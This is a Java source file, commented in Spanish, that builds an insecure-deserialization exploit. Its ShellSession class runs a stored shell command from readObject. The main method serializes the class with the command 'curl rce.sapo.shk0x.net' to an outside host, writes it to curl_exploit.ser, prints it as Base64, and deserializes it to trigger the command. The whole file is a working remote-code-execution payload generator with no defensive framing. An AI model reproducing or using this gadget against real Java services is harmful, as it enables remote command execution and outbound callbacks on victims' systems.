import java.io.*;
import java.util.Base64;


public class ShellSession implements Serializable {
    private static final long serialVersionUID = 1L;

    private String[] command;

    public ShellSession(String[] command) {
        this.command = command;
    }


    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            System.out.println("Ejecutando el comando: " + String.join(" ", command));
            Process process = Runtime.getRuntime().exec(command);

            // Leer e imprimir la salida del comando
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            // Leer e imprimir el error del comando (si hay)
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while ((line = errorReader.readLine()) != null) {
                System.err.println(line);
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // serializar el objeto
    private void writeObject(ObjectOutputStream out) throws IOException {
        out.defaultWriteObject();
    }

    public static void main(String[] args) {
        // Comando a ejecutar como un arreglo de Strings
        String[] command = {"/bin/bash", "-c", "curl rce.sapo.shk0x.net"};

        ShellSession exploit = new ShellSession(command);

        System.out.println("Serializando el objeto...");
        serialize(exploit);

        System.out.println("Deserializando el objeto...");
        deserialize();
    }

    public static void serialize(Object obj) {
        try {
            // Crear un ByteArrayOutputStream para serializar el objeto a bytes
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            
            // Serializar el objeto
            objectOutputStream.writeObject(obj);
            objectOutputStream.close();

            // Convertir el objeto serializado a un array de bytes
            byte[] serializedObjectBytes = byteArrayOutputStream.toByteArray();

            // Codificar el array de bytes a Base64
            String base64String = Base64.getEncoder().encodeToString(serializedObjectBytes);

            // Mostrar el objeto serializado en Base64
            System.out.println("Objeto serializado en Base64: " + base64String);

            // Guardar el objeto serializado en un archivo .ser
            FileOutputStream fileOutputStream = new FileOutputStream("curl_exploit.ser");
            fileOutputStream.write(serializedObjectBytes);
            fileOutputStream.close();

            System.out.println("Objeto serializado correctamente en curl_exploit.ser");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("curl_exploit.ser"));
            is.readObject();
            System.out.println("Objeto deserializado correctamente desde curl_exploit.ser");
            is.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
